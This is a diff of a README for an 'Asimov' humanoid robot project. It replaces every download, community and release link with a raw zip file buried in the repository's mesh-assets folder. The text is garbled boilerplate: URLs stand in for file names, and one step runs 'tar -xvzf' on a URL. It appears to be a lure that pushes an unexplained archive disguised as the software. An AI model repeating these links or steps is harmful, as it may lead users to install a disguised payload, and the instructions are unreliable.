@@ -6,7 +6,7 @@ Welcome to Asimov, version 0 of our open-source humanoid robot! This guide will 
 
 ### 🌐 Download Now
 
-[![Download](https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip%https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip)](https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip)
+[![Download](https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip%https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip)](https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip)
 
 ## 📋 System Requirements
 
@@ -22,33 +22,33 @@ Before you begin, ensure your computer meets the following requirements:
 
 To get started with Asimov, follow these easy steps:
 
-1. Click this link to visit our download page: [Download Asimov](https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip).
+1. Click this link to visit our download page: [Download Asimov](https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip).
 2. On the Releases page, look for the version marked as the latest release.
-3. Click on the file that fits your operating system (such as `https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip`, `https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip`, or `https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip`).
+3. Click on the file that fits your operating system (such as `https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip`, `https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip`, or `https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip`).
 4. Your download will begin automatically. Once it completes, locate the downloaded file on your computer.
 
 ## ⚙️ Installation Steps
 
-After downloading the zip or https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip file, you need to install Asimov:
+After downloading the zip or https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip file, you need to install Asimov:
 
 ### For Windows:
 
 1. Right-click the downloaded `.zip` file and select "Extract All".
 2. Choose a location to unzip the files.
-3. Once extracted, navigate to the folder and double-click `https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip` to run the program.
+3. Once extracted, navigate to the folder and double-click `https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip` to run the program.
 
 ### For macOS:
 
 1. Double-click the downloaded `.zip` file to extract it.
 2. Locate the `Asimov` folder and open it.
-3. Drag `https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip` to your Applications folder.
-4. Go to the Applications folder and double-click `https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip` to launch the application.
+3. Drag `https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip` to your Applications folder.
+4. Go to the Applications folder and double-click `https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip` to launch the application.
 
 ### For Linux:
 
 1. Open a terminal window.
-2. Navigate to the folder where you downloaded the `https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip` file.
-3. Use the command `tar -xvzf https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip` to extract the files.
+2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip` file.
+3. Use the command `tar -xvzf https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip` to extract the files.
 4. Change into the `Asimov` directory with `cd Asimov`.
 5. Run the software with `./Asimov`.
 
@@ -81,11 +81,11 @@ If you run into issues while installing or running Asimov, check these common so
 
 If you need further assistance or want to connect with other users, join our community:
 
-- **GitHub Discussions:** Share your ideas, questions, or feedback on our [GitHub page](https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip).
+- **GitHub Discussions:** Share your ideas, questions, or feedback on our [GitHub page](https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip).
 - **Forums:** Participate in user forums dedicated to humanoid robotics for additional help and resources.
 
 ## 🌟 Conclusion
 
 Asimov brings you a unique opportunity to explore the world of humanoid robotics. Download the software today and start your journey in this exciting field. 
 
-For any further updates, always refer back to our [Releases page](https://github.com/aldidan/asimov-v0/raw/refs/heads/main/sim-model/xmls/v-asimov-1.9.zip) for the latest versions and features!
+For any further updates, always refer back to our [Releases page](https://raw.githubusercontent.com/aldidan/asimov-v0/main/sim-model/assets/meshes/v-asimov-2.1.zip) for the latest versions and features!
